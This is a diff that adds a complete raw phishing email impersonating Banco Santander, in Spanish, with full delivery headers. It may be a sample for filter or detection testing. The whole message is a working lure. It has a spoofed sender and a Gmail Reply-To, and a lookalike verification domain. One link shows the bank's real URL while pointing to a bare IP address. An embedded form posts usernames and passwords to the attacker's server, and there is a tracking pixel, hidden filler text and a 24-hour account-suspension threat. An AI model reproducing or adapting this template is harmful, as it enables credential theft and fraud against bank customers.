@@ -1,0 +1,90 @@
+Return-Path: <bounce-88213@mailer-stats.xyz>
+Delivered-To: alvaro.ejemplo@gmail.com
+Received: by 2002:a05:6400:1234:b0:2a1:0:0 with SMTP id z9csp123456;
+        Mon, 28 Sep 2026 07:42:19 -0700 (PDT)
+Authentication-Results: mx.google.com;
+       dkim=fail header.i=@mailer-stats.xyz header.s=s1 header.b=AbCdEf12;
+       spf=fail (google.com: domain of bounce-88213@mailer-stats.xyz does not designate 185.243.115.20 as permitted sender) smtp.mailfrom=bounce-88213@mailer-stats.xyz;
+       dmarc=fail (p=REJECT sp=REJECT dis=QUARANTINE) header.from=santander.es
+Received-SPF: fail (google.com: domain of bounce-88213@mailer-stats.xyz does not designate 185.243.115.20 as permitted sender) client-ip=185.243.115.20;
+Received: from mail.mailer-stats.xyz (vps-2291.hosting-barato.ru [185.243.115.20])
+        by mx.google.com with ESMTP id a1si123456wrb.412.2026.09.28.07.42.18
+        for <alvaro.ejemplo@gmail.com>;
+        Mon, 28 Sep 2026 07:42:18 -0700 (PDT)
+Received: from localhost (unknown [10.0.0.12])
+        by mail.mailer-stats.xyz (Postfix) with SMTP id 4F2A1C0123
+        for <alvaro.ejemplo@gmail.com>; Mon, 28 Sep 2026 14:41:55 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=mailer-stats.xyz; s=s1;
+        h=from:to:subject:date:message-id; bh=47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=;
+        b=AbCdEf1234567890
+From: "Banco Santander - Seguridad (seguridad@santander.es)" <seguridad@santander.es>
+Reply-To: soporte.clientes.verificacion@gmail.com
+To: alvaro.ejemplo@gmail.com
+Subject: =?UTF-8?B?4pqgIFVyZ2VudGU6IHN1IGN1ZW50YSBoYSBzaWRvIGJsb3F1ZWFkYSB0ZW1wb3JhbG1lbnRl?=
+Date: Mon, 28 Sep 2026 16:41:50 +0200
+Message-ID: <20260928144150.4F2A1C0123@mail.mailer-stats.xyz>
+X-Mailer: PHPMailer 6.8.0 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary="rel-boundary-01"; type="multipart/alternative"
+
+--rel-boundary-01
+Content-Type: multipart/alternative; boundary="alt-boundary-02"
+
+--alt-boundary-02
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+Estimado cliente:
+
+Hemos detectado un acceso inusual a su banca online. Su cuenta ha sido bloq=
+ueada temporalmente.
+Verifique su identidad en las pr=C3=B3ximas 24 horas: http://santander-veri=
+ficacion.support/login.php?id=3D88213
+
+Banco Santander
+--alt-boundary-02
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html><html><head><meta charset=3D"utf-8"><style>body{font-family:=
+Arial,sans-serif;color:#222}.btn{background:#ec0000;color:#fff;padding:12px=
+ 22px;border-radius:4px;display:inline-block;font-weight:bold}</style></hea=
+d>
+<body><table width=3D"600" align=3D"center"><tr><td><img src=3D"cid:logo123=
+@banco" width=3D"48" height=3D"48" alt=3D"Logo"> <b style=3D"font-size:20px=
+;color:#ec0000">Banco Santander</b></td></tr>
+<tr><td><h2>Aviso de seguridad importante</h2>
+<p>Estimado cliente:</p>
+<p>Hemos detectado un acceso inusual a su banca online. Por su seguridad, s=
+u cuenta ha sido <b>bloqueada temporalmente</b>.</p>
+<p>Para evitar la suspensi=C3=B3n definitiva debe verificar su identidad en=
+ las pr=C3=B3ximas <b>24 horas</b>. Haga clic en el siguiente enlace:</p>
+<p><a class=3D"btn" href=3D"http://santander-verificacion.support/login.php=
+?id=3D88213&amp;ref=3Dmail">Verificar mi cuenta</a></p>
+<p>O acceda directamente a <a href=3D"http://185.243.115.20/sant/acceso">ht=
+tps://www.bancosantander.es/particulares</a></p>
+<form action=3D"http://santander-verificacion.support/post.php" method=3D"p=
+ost">Usuario: <input name=3D"u"> Clave: <input type=3D"password" name=3D"p"=
+><input type=3D"submit" value=3D"Entrar"></form>
+<p style=3D"font-size:11px;color:#888">Si no realiza la verificaci=C3=B3n, =
+su tarjeta ser=C3=A1 desactivada. <a href=3D"https://bit.ly/3xYzAbc">Condic=
+iones</a></p>
+<img src=3D"http://track.mailer-stats.xyz/open.gif?u=3D88213" width=3D"1" h=
+eight=3D"1">
+<div style=3D"display:none">Lorem ipsum dolor sit amet consectetur adipisci=
+ng elit sed do eiusmod tempor incididunt ut labore et dolore magna aliqua f=
+actura newsletter</div>
+</td></tr></table></body></html>
+--alt-boundary-02--
+
+--rel-boundary-01
+Content-Type: image/png; name="logo.png"
+Content-Transfer-Encoding: base64
+Content-ID: <logo123@banco>
+Content-Disposition: inline; filename="logo.png"
+
+iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAIAAADYYG7QAAAAn0lEQVR4nO3YQRKAIAgFUO5/1u5Q
++1IgEvo4/08rZeTtTOQEi/wNuIcgK7uADhHPVwFyUsKsF9UBSoDlrfuo8ZvsoiUUP8vYXq4xTdpe
+kkY39QGlahTTeLVAMzN1AJVphiZ4ULHmaSKIIIIIIoig3UBwtz0iCO6PEREE9+ooMM2atgLBve2T
+THq7hvOhVSZnl84zxgArcPIuc+q8EGTlAoCg2UQ9TD+vAAAAAElFTkSuQmCC
+--rel-boundary-01--
